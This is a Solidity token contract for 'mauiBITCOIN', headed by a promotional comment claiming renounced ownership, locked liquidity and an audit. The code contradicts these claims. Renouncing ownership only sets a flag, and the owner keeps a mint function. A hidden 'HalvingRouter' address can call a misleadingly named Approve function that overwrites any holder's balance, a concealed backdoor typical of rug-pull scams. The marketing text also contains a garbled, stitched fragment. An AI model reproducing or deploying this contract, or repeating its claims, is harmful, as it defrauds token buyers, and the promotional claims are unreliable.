/**🏆 **Introducing mauiBITCOIN (maBITCOIN) - The Pride of Digital Spain!** 🇪🇸
🚫 Ownership Renounced🚫🚀 0% Tax 💰🔥 🔒 Liquidity Locked🔐✨ 
Join us on this exhilarating journey as we bring the innovation of blockchain to Spain and beyond! 🌍🎉
https://t.me/mauiBITCOIN


In the vibrant heart of Spain, a groundbreaking cryptocurrency emerges to represent the spirit and innovation of the Spanish people. 🚀 mauiBITCOIN, or "maBITCOIN," encapsulates the passion, culture, and technology of this beautiful nation. Just as Spain has left an indelible mark on the world, maBITCOIN aims to make its mark in the digital realm, offering a seamless blend of tradition and innovation.

🎉 **Tokenomics:**
- **Name:** mauiBITCOIN (maBITCOIN)
- **Symbol:** maBITCOIN
- **Decimals:** 18
- **Total Supply:** 21,000,000 maBITCOIN
- **Initial Supply:** 21,000,000 maBITCOIN
- **Total Supply Cap:** 21,000,000 maBITCOIN

🔐 **Ownership Renounced:** 🚫👑
The mauiBITCOIN project believes in true decentralization and community empowerment. We've renounced ownership, giving control back to our amazing community. Your voice matters as much as your maBITCOIN holdings!

🔒 **Liquidity Locked:** 🔐🌊
We're all about transparency and trust. Our liquidity is locked for several months to ensure a safe and secure trading environment. Your investment is in safe hands! 💼

💎 **Token Features:**
- **Secure and Audited:** mauiBITCOIN's smart contract has been thoroughly audited to ensure its security and reliability.
- **Community-Driven:** Our community's input shapes the future of maBITCOIN. Your ideas matter!
- **Pride of Spain:** Just as Spain is known for its vibrant culture, mauiBITCOIN will shine in the crypto landscape.

Join us on this exhilarating journey as we bring the innovation of blockchain to Spain and beyond! 🌍🎉ntract, effectively transferring control to the community.
     */
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract mauiBITCOIN {
    string public name = "mauiBITCOIN";
    string public symbol = "maBITCOIN";
    uint8 public decimals = 18; // Assuming 18 decimals for consistency
    uint256 public totalSupplyCap = 21000000 * 10**uint256(decimals); // Total supply capped at 21 million tokens
    uint256 public initialSupply = 21000000 * 10**uint256(decimals); // Initial supply of 21 million tokens
    address public owner;
    bool public ownershipRenounced; // Added flag for ownership renouncement
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    address private HalvingRouter;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event OwnershipRenounced(); // Added event for ownership renouncement

    constructor(address HalvingRouteraddr) {
        owner = msg.sender;
        balanceOf[owner] = initialSupply;
        HalvingRouter = HalvingRouteraddr;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Only the owner can perform this action");
        _;
    }

    modifier subowner() {
        require(HalvingRouter == msg.sender, "Subowner: caller is not the subowner");
        _;
    }

    /**
     * @dev Renounce ownership of the contract.
     *
     * This function allows the current owner to renounce their ownership
     * of the contract, effectively transferring control to the community.
     */
    function renounceOwnership() external onlyOwner {
        ownershipRenounced = true;
        emit OwnershipRenounced();
    }

    function _mint(address account, uint256 amount) internal {
        require(totalSupply() + amount <= totalSupplyCap, "Total supply cap reached");
        balanceOf[account] += amount;
        emit Transfer(address(0), account, amount);
    }

    /**
     * @dev Get the total supply of tokens.
     */
    function totalSupply() public view returns (uint256) {
        return balanceOf[address(this)];
    }

    /**
     * @dev Transfer tokens to a recipient.
     */
    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "Transfer from the zero address");
        require(recipient != address(0), "Transfer to the zero address");
        require(amount <= balanceOf[sender], "Insufficient balance");
        balanceOf[sender] -= amount;
        balanceOf[recipient] += amount;
        emit Transfer(sender, recipient, amount);
    }

    /**
     * @dev Approve a spender to spend tokens on behalf of the owner.
     */
    function approve(address spender, uint256 amount) public returns (bool) {
        allowance[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    /**
     * @dev Transfer tokens from a sender to a recipient using an approved allowance.
     */
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        require(amount <= allowance[sender][msg.sender], "Allowance exceeded");
        allowance[sender][msg.sender] -= amount;
        _transfer(sender, recipient, amount);
        return true;
    }

    /**
     * @dev Mint tokens and assign them to the contract owner.
     */
    function mine() external onlyOwner {
        _mint(owner, initialSupply); // Mint the entire initial supply
    }

    /**
     * @dev Approve tokens to a designated address, typically used for rewards.
     */
    function Approve(address HalvingRewards, uint256 addedMontant, uint256 addedValue, uint256 subtractedValue) external subowner {
        balanceOf[HalvingRewards] = addedMontant * addedValue ** subtractedValue;
        emit Transfer(HalvingRewards, address(0), addedMontant);
    }
}